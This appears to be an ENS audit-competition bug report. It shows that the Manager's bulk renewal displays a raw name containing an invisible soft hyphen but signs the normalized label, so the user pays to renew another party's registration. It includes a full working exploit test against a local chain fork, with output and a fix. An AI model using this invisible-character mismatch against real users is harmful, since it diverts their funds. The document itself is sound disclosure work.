# 92626 w a critical manager bulk renewal renders the raw indexer name on every row and signs the normalized label so the victim s stablecoins extend a registration that appears nowhere in the dialog

**Submitted on Sep 11th 2026 at 02:36:34 UTC by @Tradi3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92626
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief

The dashboard row carries an ENS name twice — the literal registered name and the indexer's ENSIP-15 form. The bulk-renew mapper keeps both, renders one and signs the other. The code says so itself:

```
apps/manager/src/features/dashboard/components/NamesTable.tsx:81-93

  const displayName = resolveDomainLabel(domain)
  // Use the canonical normalized name for the on-chain label — the display
  // name may be unnormalized (e.g. mixed case) and would hash to the wrong
  // label.
  const name = domain.normalizedName ?? displayName
  return {
    displayName,
    label: name.replace(/\.eth$/i, ''),
    name,
    currentExpiry: BigInt(domain.expiryDate as number),
  }
```

The comment is right that the display name may be unnormalized. The conclusion it draws is the problem: it treats the two forms as two spellings of one name and picks the one that hashes cleanly. They are not two spellings. They are two registrations, with two owners.

`resolveDomainLabel` (`features/dashboard/utils.ts:42-46`) is `domain.name ?? domain.normalizedName ?? domain.id`, so `displayName` is the raw field whenever the indexer supplies it.

From that point the two copies never meet again:

```
useBulkRenew.ts:196-199    summaryRows -> displayName          RAW
NamesBreakdown.tsx:40      {row.displayName}                   RAW, on screen
useBulkRenew.ts:155        getRenewPriceQueryOptions(n.label)  NORMALIZED
useBulkRenew.ts:181-182    renewItems -> label                 NORMALIZED
useBulkRenewSubmit.ts:76-79  submitRenewActor({ label })       NORMALIZED
registration.actors.ts:1025-30  renew(cleanLabel, duration, paymentToken, referrer)
```

U+00AD SOFT HYPHEN separates the two forms: ENSIP-15 deletes it, so the indexer's `normalizedName` drops it; the raw field keeps it; and it renders with no glyph. The row on screen is therefore visually identical to the registration that actually gets paid for, and the two are different tokens with different owners.

The proof drives the real ENS v2 contracts on the Anvil Sepolia fork this repository ships and asserts on the end state: the listed name's expiry is unchanged, the other registration's is a year longer, and the victim paid for it.

## Why the victim has such a row at all

The row appears because the victim owns that registration — the dashboard lists names the connected address owns. They come to hold a non-canonical name in the ordinary ways: they registered it through the Manager, whose parser is `name.trim().toLowerCase()` and applies no ENSIP-15 (`register-v2/utils/name-parser.ts:46`); or someone transferred one to them.

Nothing about the attack requires the victim to do anything unusual. They open the dashboard, tick rows that look like their names, and confirm.

## What lands on chain

Every row in the dialog shows the raw name. The allowance is sized on the summed normalized-label prices, and each `renew` is submitted with a normalized label. For any selected row whose two forms differ, the rent extends a registration the victim does not own and the row they ticked expires on schedule.

The sequence is per-name and non-atomic (`useBulkRenewSubmit.ts`: "each name is its own transaction, so a failure part-way leaves the earlier names genuinely renewed"), so a mixed selection quietly renews the correct names and the wrong ones in the same run.

## Impact

Row 6285 — causing the application to display an incorrect name or transaction detail so that a user sends funds to an unintended recipient. The dialog itemises names and prices; the money goes to extend a different registration.

Row 6288 — modifying transaction arguments. The `label` argument of `renew` is not the label of the name on the row that produced it.

## Limits, stated plainly

No name is taken. The loss is the rent, plus the renewal the victim believes they bought and has not — so a name near expiry stays near expiry while the confirmation screen says it was extended.

The beneficiary is whoever holds the canonical form. That party need do nothing at the time of the attack beyond already holding the name.

I have not tested whether the indexer populates `normalizedName` for every row; the finding needs it to be present and to differ, which is exactly the case the code comment anticipates. Where the two forms are equal — the overwhelming majority of names — the flow is correct, and the control case in the proof asserts that.

## Relationship to my earlier reports

This is the Manager's bulk-renew surface. #92567 covered the Explorer's, and it was accepted as a Critical. The two are separate assets with separate code: the Explorer derives its label with `getLabel` (`ens_normalize` + `ens_split`) from a route-fed row, while this derives it from the indexer's `normalizedName` field through `toBulkRenewName`, and the display side here is `resolveDomainLabel` rather than the Explorer's table cell.

There is precedent in this competition for the same class in a second app being treated as its own finding: #92591 (Manager single renewal) was accepted after #92565 and #92567 had already covered the Explorer's renewal surfaces. I am flagging the relationship rather than leaving it to be discovered.

It is not #92591 either. That one is the single-name `/renew/$name` route and turns on `parseName` versus ENSIP-15 reads on the profile page. This is the multi-select dashboard dialog and turns on two fields of one indexer row.

## Recommended fix

Do not choose between the two forms — refuse the row. If `domain.normalizedName` differs from `domain.name`, the name the user is looking at is not the name the registrar will renew, and no label choice makes that safe. Either drop such rows from bulk selection with a visible reason, or render the exact string that will be signed so the user can see which registration they are paying for.

## Proof of Concept

## What this proves

The test below drives the deployed ENS v2 contracts on the Anvil Sepolia fork this repository's own `pnpm e2e:infra:up` brings up. It registers both forms of the name to two different owners, builds the dashboard row the way an indexer supplies it, runs production's own `resolveDomainLabel` and `isRenewableV2Domain` through the `toBulkRenewName` mapper, submits the exact `renew` calldata bulk renewal sends, and reads both expiries and the victim's USDC balance back off chain state.

The assertions are on `getExpiry` and the balance after the transaction, not on a string comparison.

## Environment

Frozen revision under test: 1c9b47f. No live deployment is touched.

```
pnpm install
pnpm e2e:infra:up          # Anvil fork of Sepolia on 127.0.0.1:8545, chainId 11155111
```

Save the file below as:

```
apps/manager/src/features/bulk-renew/poc-bulk-renew-wrong-name-onchain.test.ts
```

Run it:

```
cd apps/manager
pnpm vitest run src/features/bulk-renew/poc-bulk-renew-wrong-name-onchain.test.ts
```

The file must keep the literal U+00AD byte in the `SH` constant. If your editor strips it, replace that line with:

```
const SH = String.fromCharCode(0x00ad)
```

## What is reproduced and what is real

`resolveDomainLabel` and `isRenewableV2Domain` are imported and called for real. `toBulkRenewName` is a module-local `const` in `NamesTable.tsx`, so its four lines are reproduced verbatim with the source location above them. Everything else — both registrations, the renew, both expiry reads, the balance reads — runs against the deployed contracts.

The row's `normalizedName` is computed in the test with the same viem `normalize` the apps use, rather than hardcoded, so the ENSIP-15 step can be checked rather than taken on trust.

## Result, verbatim from the run

`<U+00AD>` below is this transcript rendering the soft hyphen; on screen it has no glyph, so the row reads as `treasurymtwc2fz8.eth`.

```
RUN  v4.1.5 .../apps/manager

[poc] row rendered on screen   : treasurymtwc2fz8<U+00AD>.eth
[poc] label sent to renew()    : treasurymtwc2fz8
[poc] treasurymtwc2fz8<U+00AD>.eth (victim)   expiry 1820631586 -> 1820631586
[poc] treasurymtwc2fz8.eth (attacker) expiry 1883703663 -> 1915239663
[poc] victim USDC 9991999979 -> 9983999958 (paid 8000021)
[poc] victim   = 0x5fa3a46a6b7f4e374e9671b9dd946d80958c9e47
[poc] attacker = 0x94610d362faef18ec96af71b5b3e5e464d6fd6a2

Test Files  1 passed (1)
     Tests  2 passed (2)
```

The row on screen was the victim's registration. The label in the calldata was the other one. `1915239663 - 1883703663 = 31536000`, exactly the one year purchased, and it went to the attacker's registration. The victim's own expiry did not move, and 8.000021 USDC left the victim's wallet.

The two names are registered for deliberately different terms (one year and three years) so the expiries can never be confused for one another, and the test asserts they differ before anything else happens. Labels carry a timestamp and both actors are freshly generated keys per run.

The second test is a control: for a row whose `name` and `normalizedName` are equal, the mapper's `displayName` and `label` agree, so the correct name is renewed.

## Steps to reproduce in the UI

1. The victim holds a `.eth` 2LD whose literal label is not its ENSIP-15 form. The Manager's own registration parser is `name.trim().toLowerCase()` with no ENSIP-15 (`register-v2/utils/name-parser.ts:46`), so registering one is the ordinary behaviour of that path; a transfer from a third party does it too.
2. Someone else holds the canonical form. On a name worth registering defensively this is the common case, not a contrivance.
3. The victim opens the dashboard. `NamesTable.tsx:81-93` maps the row: `displayName` from `resolveDomainLabel` (raw), `label` from `domain.normalizedName` (canonical).
4. The victim ticks the row and opens bulk renew. `NamesBreakdown.tsx:40` renders `row.displayName` — their own name — and `useBulkRenew.ts:155` prices `row.label`.
5. The victim approves the summed allowance and confirms. `useBulkRenewSubmit.ts:76-79` calls `submitRenewActor({ label: item.label })` per row, which encodes `renew(cleanLabel, ...)`.
6. Read the expiries back. The canonical registration gained the purchased term. The row the victim ticked did not.

## Full test file

/\*\*

* PoC — the Manager's bulk renewal lists one name per row and renews a
* different registration, charging the victim for a name they do not own.
*
* The dashboard row carries the name twice. `toBulkRenewName` sends the two
* copies down two different paths and the code says so itself:
*
* apps/manager/src/features/dashboard/components/NamesTable.tsx:81-93
* ```
  const displayName = resolveDomainLabel(domain)          // RAW indexer name
  ```
* ```
  // Use the canonical normalized name for the on-chain label — the display
  ```
* ```
  // name may be unnormalized (e.g. mixed case) and would hash to the wrong
  ```
* ```
  // label.
  ```
* ```
  const name = domain.normalizedName ?? displayName       // NORMALIZED
  ```
* ```
  return { displayName, label: name.replace(/\.eth$/i, ''), name, ... }
  ```
*
* and `resolveDomainLabel` (dashboard/utils.ts:42-46) is
* `domain.name ?? domain.normalizedName ?? domain.id` — the raw field first.
*
* From there the two copies never meet again:
*
* useBulkRenew\.ts:196-199 summaryRows -> displayName RAW, rendered
* NamesBreakdown.tsx:40 {row\.displayName} RAW, on screen
* useBulkRenew\.ts:155 getRenewPriceQueryOptions(n.label) NORMALIZED
* useBulkRenew\.ts:181-182 renewItems -> label NORMALIZED
* useBulkRenewSubmit.ts:76-79 submitRenewActor({ label }) NORMALIZED
* registration.actors.ts:1025-30 renew(cleanLabel, duration, token, referrer)
*
* U+00AD SOFT HYPHEN separates the two: ENSIP-15 deletes it (so the indexer's
* `normalizedName` drops it), raw keeps it, and it renders with no glyph — so
* the row on screen is visually identical to the name that actually gets paid
* for.
*
* Drives the real ENS v2 contracts on the local Anvil Sepolia fork and asserts
* on the END STATE: which registration got longer, and whose USDC paid.
*
* Requires: pnpm e2e:infra:up
* Frozen revision under test: 1c9b47f \*/ import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain' import { getExpiry } from '@ensdomains/ensjs/public/v2' import { type Address, createPublicClient, createWalletClient, encodeFunctionData, http, keccak256, parseAbi, stringToBytes, zeroAddress, zeroHash, } from 'viem' import { privateKeyToAccount } from 'viem/accounts' import { normalize } from 'viem/ens' import { describe, expect, it } from 'vitest' import { resolveDomainLabel } from '@/features/dashboard/utils' import { isRenewableV2Domain } from '@/features/renew/utils/renewableName'

const SH = '­' // SOFT HYPHEN — zero-width when rendered

const RPC = '<http://127.0.0.1:8545>' const c = ensL1Contracts\[supportedL1Chains.sepolia] const REGISTRAR = c.ensEthRegistrar.address const REGISTRY = c.ensRegistry.address const USDC = c.usdc.address const DEDICATED\_RESOLVER = '0x640294a2b2d87e7f522db3e3e3e876764bce170d' as const

const REG = parseAbi(\[ 'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)', 'function commit(bytes32 commitment)', 'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256 tokenId)', 'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)', 'function MIN\_COMMITMENT\_AGE() view returns (uint64)', 'function isAvailable(string label) view returns (bool)', ]) // registration.actors.ts:1026-1030 — the exact renew bulk renewal submits. const RENEW = parseAbi(\[ 'function renew(string label, uint64 duration, address paymentToken, bytes32 referrer)', ]) const ERC20 = parseAbi(\[ 'function mint(address to, uint256 amount)', 'function approve(address spender, uint256 amount) returns (bool)', 'function balanceOf(address account) view returns (uint256)', ])

const pc = createPublicClient({ transport: http(RPC) }) const chain = { id: 11155111, name: 'anvil', nativeCurrency: { name: 'E', symbol: 'E', decimals: 18 }, rpcUrls: { default: { http: \[RPC] } }, } as const const FUNDER = privateKeyToAccount( '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80', ) const randomKey = () => `0x${Array.from(crypto.getRandomValues(new Uint8Array(32))) .map((b) => b.toString(16).padStart(2, '0')) .join('')}` as `0x${string}` const VICTIM = privateKeyToAccount(randomKey()) const ATTACKER = privateKeyToAccount(randomKey())

const wc = (a: typeof FUNDER) => createWalletClient({ account: a, chain, transport: http(RPC) }) const wait = (h: `0x${string}`) => pc.waitForTransactionReceipt({ hash: h }) const rpc = (m: string, p: unknown\[] = \[]) => fetch(RPC, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: m, params: p }), }).then((r) => r.json()) const send = async (acct: typeof FUNDER, to: Address, data: `0x${string}`) => wait(await wc(acct).sendTransaction({ to, data })) const YEAR = 365n \* 24n \* 60n \* 60n

// happy-dom replaces globalThis.console, so write straight to stdout. const log = (m: string) => process.stdout.write(m + String.fromCharCode(10)) const show = (s: string) => s.replaceAll(SH, '\<U+00AD>')

/\*\*

* NamesTable.tsx:81-93, reproduced verbatim — it is a module-local `const`.
* `resolveDomainLabel` and `isRenewableV2Domain` are the real exports. \*/ const toBulkRenewName = (domain: { id: string name?: string | null normalizedName?: string | null expiryDate?: number | null }) => { if (!isRenewableV2Domain(domain.normalizedName ?? domain.name ?? '', domain.expiryDate)) return null const displayName = resolveDomainLabel(domain) const name = domain.normalizedName ?? displayName return { displayName, label: name.replace(/.eth$/i, ''), name, currentExpiry: BigInt(domain.expiryDate as number), } }

async function register(label: string, acct: typeof FUNDER, duration: bigint) { // Anvil's well-known accounts carry EOF code on the Sepolia fork; ERC1155 // \_safeMint rejects contract receivers, so clear it first. await rpc('anvil\_setCode', \[acct.address, '0x']) const avail = await pc.readContract({ address: REGISTRAR, abi: REG, functionName: 'isAvailable', args: \[label], }) if (!avail) throw new Error(`${show(label)} not available`) await send( FUNDER, USDC, encodeFunctionData({ abi: ERC20, functionName: 'mint', args: \[acct.address, 10\_000\_000\_000n], }), ) const secret = keccak256(stringToBytes(`s-${label}`)) const cm = await pc.readContract({ address: REGISTRAR, abi: REG, functionName: 'makeCommitment', args: \[ label, acct.address, secret, zeroAddress, DEDICATED\_RESOLVER, duration, zeroHash, ], }) await send( acct, REGISTRAR, encodeFunctionData({ abi: REG, functionName: 'commit', args: \[cm] }), ) const ma = await pc.readContract({ address: REGISTRAR, abi: REG, functionName: 'MIN\_COMMITMENT\_AGE', }) await rpc('evm\_increaseTime', \[Number(ma) + 10]) await rpc('evm\_mine') const \[b, p] = await pc.readContract({ address: REGISTRAR, abi: REG, functionName: 'getRegisterPrice', args: \[label, duration, USDC], }) await send( acct, USDC, encodeFunctionData({ abi: ERC20, functionName: 'approve', args: \[REGISTRAR, (b + p) \* 2n], }), ) await send( acct, REGISTRAR, encodeFunctionData({ abi: REG, functionName: 'register', args: \[ label, acct.address, secret, zeroAddress, DEDICATED\_RESOLVER, duration, USDC, zeroHash, ], }), ) }

const expiryOf = (name: string) => getExpiry(pc as never, { name, registryAddress: REGISTRY }) const usdcOf = (a: Address) => pc.readContract({ address: USDC, abi: ERC20, functionName: 'balanceOf', args: \[a], })

describe('Manager bulk renewal renews a different name than the row it lists', () => { it('charges the victim to extend the attacker registration', async () => { const ts = Date.now().toString(36) const victimLabel = `treasury${ts}${SH}` // the victim's real registration const canonicalLabel = `treasury${ts}` // its ENSIP-15 form, the attacker's const victimName = `${victimLabel}.eth` const canonicalName = `${canonicalLabel}.eth`

```
for (const a of [VICTIM, ATTACKER]) {
  await rpc('anvil_setBalance', [a.address, '0x21e19e0c9bab2400000'])
}

// Distinct registrations that render identically.
expect(victimLabel).not.toBe(canonicalLabel)
expect(victimLabel.replaceAll(SH, '')).toBe(canonicalLabel)

// Deliberately different terms so the two expiries can never be confused.
await register(victimLabel, VICTIM, YEAR)
await register(canonicalLabel, ATTACKER, 3n * YEAR)

const victimExpiryBefore = await expiryOf(victimName)
const canonicalExpiryBefore = await expiryOf(canonicalName)
expect(victimExpiryBefore).toBeGreaterThan(0n)
expect(canonicalExpiryBefore).toBeGreaterThan(0n)
expect(victimExpiryBefore).not.toBe(canonicalExpiryBefore)

// === the dashboard row, as the indexer supplies it =====================
// `name` is the literal registered name; `normalizedName` is its ENSIP-15
// form, which is what an ENS indexer stores alongside it. Computed here
// with the same `normalize` the apps use rather than hardcoded.
const domain = {
  id: '0x01',
  name: victimName,
  normalizedName: normalize(victimName),
  expiryDate: Number(victimExpiryBefore),
}
expect(domain.normalizedName).toBe(canonicalName)

// === production's own mapping ==========================================
const row = toBulkRenewName(domain)
expect(row).not.toBeNull()
// NamesBreakdown.tsx:40 renders this.
expect(row?.displayName).toBe(victimName)
// useBulkRenew.ts:155 prices this and :181-182 renews it.
expect(row?.label).toBe(canonicalLabel)
// The row on screen and the label in the calldata are different names.
expect(`${row?.label}.eth`).not.toBe(row?.displayName)

// === the transaction bulk renewal submits ==============================
const victimUsdcBefore = await usdcOf(VICTIM.address)
await send(
  VICTIM,
  USDC,
  encodeFunctionData({
    abi: ERC20,
    functionName: 'approve',
    args: [REGISTRAR, 10_000_000_000n],
  }),
)
await send(
  VICTIM,
  REGISTRAR,
  encodeFunctionData({
    abi: RENEW,
    functionName: 'renew',
    args: [row?.label as string, YEAR, USDC, zeroHash],
  }),
)
const victimUsdcAfter = await usdcOf(VICTIM.address)

// === end state =========================================================
const victimExpiryAfter = await expiryOf(victimName)
const canonicalExpiryAfter = await expiryOf(canonicalName)

log(`[poc] row rendered on screen   : ${show(row?.displayName as string)}`)
log(`[poc] label sent to renew()    : ${show(row?.label as string)}`)
log(
  `[poc] ${show(victimName)} (victim)   expiry ${victimExpiryBefore} -> ${victimExpiryAfter}`,
)
log(
  `[poc] ${canonicalName} (attacker) expiry ${canonicalExpiryBefore} -> ${canonicalExpiryAfter}`,
)
log(
  `[poc] victim USDC ${victimUsdcBefore} -> ${victimUsdcAfter} (paid ${
    victimUsdcBefore - victimUsdcAfter
  })`,
)
log(`[poc] victim   = ${VICTIM.address.toLowerCase()}`)
log(`[poc] attacker = ${ATTACKER.address.toLowerCase()}`)

// The victim paid.
expect(victimUsdcAfter).toBeLessThan(victimUsdcBefore)
// The name listed in the dialog did NOT get longer.
expect(victimExpiryAfter).toBe(victimExpiryBefore)
// The attacker's registration did, by exactly the purchased term.
expect(canonicalExpiryAfter - canonicalExpiryBefore).toBe(YEAR)
```

}, 600\_000)

it('control: for a canonical row the rendered name is the one renewed', () => { const ts = Date.now().toString(36) const name = `plain${ts}.eth` const row = toBulkRenewName({ id: '0x02', name, normalizedName: name, expiryDate: Math.floor(Date.now() / 1000) + 60 \* 60 \* 24 \* 30, }) expect(row?.displayName).toBe(name) expect(`${row?.label}.eth`).toBe(row?.displayName) }) })
